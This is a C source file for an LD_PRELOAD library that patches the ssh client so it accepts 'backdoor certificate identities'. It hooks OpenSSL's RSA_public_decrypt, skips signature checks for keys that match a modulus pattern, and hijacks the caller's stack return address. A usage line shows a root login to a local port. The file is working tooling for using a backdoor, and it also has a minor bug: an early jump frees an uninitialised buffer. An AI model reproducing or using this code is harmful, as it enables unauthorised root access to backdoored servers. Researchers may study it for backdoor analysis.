/**
 * @file ssh_patch.c
 * @author Stefano Moioli (smxdev4@gmail.com)
 * @brief Patch for ssh to disable signature verification for backdoor certificate identities
 * and allow them to be used as ssh identities (-i flag)
 *
 * to use: `LD_PRELOAD=$PWD/libssh_patch.so ssh -vvv -i /tmp/backdoor_payload_cert.pub root@localhost -p 2022`
 * 
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <openssl/bn.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <openssl/rsa.h>
#define UNW_LOCAL_ONLY
#include <libunwind.h>

static int (*orig_RSA_public_decrypt)(
	int flen, const unsigned char *from, unsigned char *to,
	RSA *rsa, int padding
) = NULL;

void __attribute__((constructor)) init(){
	orig_RSA_public_decrypt = dlsym(RTLD_NEXT, "RSA_public_decrypt");
	if(!orig_RSA_public_decrypt){
		fprintf(stderr, "could not find original RSA_public_decrypt\n");
		exit(1);
	}
}

extern void hijack_return();

uintptr_t orig_ret = 0;

int RSA_public_decrypt(
	int flen, const unsigned char *from, unsigned char *to,
	RSA *rsa, int padding
){
	const BIGNUM *n = NULL;
	const BIGNUM *e = NULL;
	RSA_get0_key(rsa, &n, &e, NULL);
	if(!n || !e) goto orig;

	int size = BN_num_bytes(n);
	unsigned char *buf = calloc(sizeof(unsigned char), size);
	if(!buf) return -1;

	if(BN_bn2bin(n, buf) < 0) goto orig;

	if(size <= 536 && size >= 16){
		uint32_t a, b;
		uint64_t c;
		a = *(uint32_t *)(buf + 0);
		b = *(uint32_t *)(buf + 4);
		c = *(uint32_t *)(buf + 8);
		uint64_t cmd_type = (a * b) + c;
		if(cmd_type > 3) goto orig;

		// assume it's the payload for now (signature checking would be better)
		printf("[+++++] backdoor payload detected. skipping verification\n");

		unw_cursor_t cursor; unw_context_t uc;
		unw_word_t ip, sp;
		unw_getcontext(&uc);
		unw_init_local(&cursor, &uc);

		const int steps = 2;
		uintptr_t *v_sp[steps], v_ra[steps];

		for(int i=0; i<steps && unw_step(&cursor) > 0; i++){
			unw_get_reg(&cursor, UNW_REG_IP, &ip);
			unw_get_reg(&cursor, UNW_REG_SP, &sp);
			printf ("ip = %lx, sp = %lx\n", (long) ip, (long) sp);
			
			// backtrack to get the location of the return address
			v_sp[i] = (uintptr_t *)(sp - 8);
			v_ra[i] = ip;
		}

		// save the address where our caller would return to
		orig_ret = v_ra[1];
		
		/**
		  * make `openssh_RSA_verify` (our caller) return to our hijack function,
		  * which will replace the return value
		  */
		*v_sp[1] = (uintptr_t)&hijack_return;
		free(buf);
		return 0;
	}

orig:
	if(buf) free(buf);
	return orig_RSA_public_decrypt(flen, from, to, rsa, padding);
}